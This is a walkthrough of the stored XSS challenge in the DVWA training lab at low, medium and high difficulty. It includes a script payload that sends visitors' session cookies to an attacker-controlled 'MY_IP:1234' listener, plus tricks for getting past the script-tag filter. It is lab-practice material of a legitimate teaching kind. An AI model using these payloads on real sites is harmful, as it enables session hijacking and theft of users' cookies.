# Difficulty - Low

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/XSS%20Stored/Sources/low.php)

Because there are no filters, both fields (name and message) are vulnerable to xss.
We can do something simple like: 

```
Username: whatever
Message: <img src=x onerror=alert(1)>
```
And now, because is stored, when any other user will access this page it wil get the alert pop-up.

So, we can do something like that (after we modify the `maxlength` value from html):
```JS
Username: whatever
Message: <script>var url = "http://MY_IP:1234/" + document.cookie; var xhttp = new XMLHttpRequest(); xhttp.open("GET", url, true);xhttp.send();</script>
```

Then we listen on that port (1234 in my case) and whenever somebody access that site we will get his cookies.
![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/XSS%20Stored/Pictures/1.png)


# Difficulty - Medium

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/XSS%20Stored/Sources/medium.php)


I tried to add `<img src=x>` to both input fields.
Only the `name` field is vulnerable.
![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/XSS%20Stored/Pictures/2.png)

But it is not vulnerable at `<script>` tag, because the input is filtered. The `<script>` tag is removed. So use the `<script >` tag (same, but with a space between < & >).



# Difficulty - High

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/XSS%20Stored/Sources/high.php)

I tried: 
```
Username: <img src=x onerror=alert(1)>
Message: <img src=x onerror=alert(2)>
```
and only the `alert(1)` was executed. So the username input field is vulnerable.



# Difficulty - Impossible

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/XSS%20Stored/Sources/impossible.php)
